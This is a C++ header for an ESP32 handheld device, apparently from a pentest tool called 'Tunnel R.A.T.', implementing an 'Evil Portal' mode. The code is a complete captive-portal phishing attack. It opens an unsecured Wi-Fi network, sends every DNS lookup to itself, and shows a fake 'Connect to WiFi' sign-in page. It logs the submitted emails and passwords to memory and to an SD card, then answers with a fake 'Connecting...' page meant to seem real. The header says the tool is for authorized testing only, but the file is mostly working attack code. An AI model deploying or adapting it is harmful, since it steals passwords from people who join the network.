// ===========================================================================
//  tr_evilportal.h  —  Tunnel R.A.T. // T-Pager  —  Evil Portal mode
//  Open captive-portal AP that serves a generic "network login" page and
//  logs whatever is submitted. For AUTHORIZED / OWN-NETWORK testing only.
//
//  Uses the ESP32 core WebServer + DNSServer (no extra libraries).
//  The page is intentionally generic/unbranded — it does not impersonate any
//  real company or service.
// ===========================================================================
#pragma once
#include "config.h"
#include <lvgl.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>
#include <vector>

namespace evilportal {

static WebServer *s_server = nullptr;
static DNSServer  s_dns;
static bool       s_running = false;
static IPAddress  s_apIP(192,168,4,1);
static std::vector<String> s_creds;      // captured "field1 | field2" lines

static lv_obj_t *s_lbl=nullptr, *s_list=nullptr;

// Generic, unbranded captive-portal login page (served for every request).
static const char PORTAL_HTML[] = R"HTML(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Access</title><style>
body{font-family:system-ui,sans-serif;background:#0d1117;color:#e6edf3;margin:0;padding:24px}
.c{max-width:360px;margin:8vh auto;background:#161b22;padding:24px;border-radius:10px}
h2{margin:0 0 4px}p{color:#8b949e;margin:0 0 18px}
input{width:100%;box-sizing:border-box;padding:10px;margin:6px 0;border-radius:6px;border:1px solid #30363d;background:#0d1117;color:#e6edf3}
button{width:100%;padding:11px;margin-top:10px;border:0;border-radius:6px;background:#238636;color:#fff;font-size:15px}
</style></head><body><div class="c">
<h2>Connect to WiFi</h2><p>Sign in to access the internet</p>
<form method="POST" action="/login">
<input name="u" placeholder="Email or username" autocomplete="username">
<input name="p" type="password" placeholder="Password" autocomplete="current-password">
<button>Connect</button></form></div></body></html>)HTML";

static void saveCred(const String &rec){
  s_creds.push_back(rec);
  if(SD.cardType()!=CARD_NONE){
    SD.mkdir(TR_SD_LOG_DIR);
    File f=SD.open(TR_SD_LOG_DIR "/portal.txt", FILE_APPEND);
    if(f){ f.println(rec); f.close(); }
  }
}

static void handleRoot(){ s_server->send(200,"text/html",PORTAL_HTML); }

static void handleLogin(){
  String rec = s_server->arg("u") + " | " + s_server->arg("p");
  saveCred(rec);
  // send them on their way so it feels real
  s_server->send(200,"text/html",
    "<html><body style='font-family:sans-serif;background:#0d1117;color:#e6edf3;padding:24px'>"
    "Connecting... please wait.</body></html>");
}

inline void start(){
  if(s_running) return;
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(s_apIP, s_apIP, IPAddress(255,255,255,0));
  WiFi.softAP(TR_PORTAL_SSID);                 // open network
  s_dns.start(53, "*", s_apIP);                // send every lookup to us
  if(!s_server) s_server=new WebServer(80);
  s_server->on("/", handleRoot);
  s_server->on("/login", HTTP_POST, handleLogin);
  s_server->onNotFound(handleRoot);            // captive-portal catch-all
  s_server->begin();
  s_running=true;
}

inline void stop(){
  if(!s_running) return;
  if(s_server) s_server->stop();
  s_dns.stop();
  WiFi.softAPdisconnect(true);
  s_running=false;
}

static void render(){
  if(s_lbl)
    lv_label_set_text_fmt(s_lbl, "%s  SSID: %s\nclients: %d   captured: %u",
      s_running?"RUNNING":"stopped", TR_PORTAL_SSID,
      s_running?WiFi.softAPgetStationNum():0, (unsigned)s_creds.size());
  if(s_list){
    static size_t shown=0;
    if(s_creds.size()!=shown){                 // append new captures to the list
      for(size_t i=shown;i<s_creds.size();i++) lv_list_add_text(s_list, s_creds[i].c_str());
      shown=s_creds.size();
    }
  }
}

static void mkBtn(lv_obj_t*p,const char*t,int x,int y,lv_event_cb_t cb){
  lv_obj_t*b=lv_btn_create(p); lv_obj_set_size(b,100,30);
  lv_obj_align(b,LV_ALIGN_TOP_LEFT,x,y); lv_obj_set_style_bg_color(b,lv_color_hex(0x301717),0);
  lv_obj_t*l=lv_label_create(b); lv_label_set_text(l,t); lv_obj_center(l);
  lv_obj_add_event_cb(b,cb,LV_EVENT_CLICKED,NULL);
}

inline void buildUI(lv_obj_t *parent){
  s_lbl=lv_label_create(parent);
  lv_label_set_long_mode(s_lbl,LV_LABEL_LONG_WRAP); lv_obj_set_width(s_lbl,lv_pct(96));
  lv_obj_set_style_text_color(s_lbl,lv_color_hex(0xFF5252),0);
  lv_obj_align(s_lbl,LV_ALIGN_TOP_LEFT,0,0);

  mkBtn(parent,"Start",0,  34,[](lv_event_t*){ start(); });
  mkBtn(parent,"Stop", 104,34,[](lv_event_t*){ stop(); });
  mkBtn(parent,"Clear",208,34,[](lv_event_t*){ s_creds.clear(); if(s_list) lv_obj_clean(s_list); });

  s_list=lv_list_create(parent);
  lv_obj_set_size(s_list,lv_pct(100),lv_pct(55));
  lv_obj_align(s_list,LV_ALIGN_BOTTOM_MID,0,0);
  lv_obj_set_style_bg_color(s_list,lv_color_hex(0x120E0E),0);
  render();
}

inline void loop(){
  if(s_running){ s_dns.processNextRequest(); s_server->handleClient(); }
  render();
}

inline void leave(){ stop(); }

} // namespace evilportal
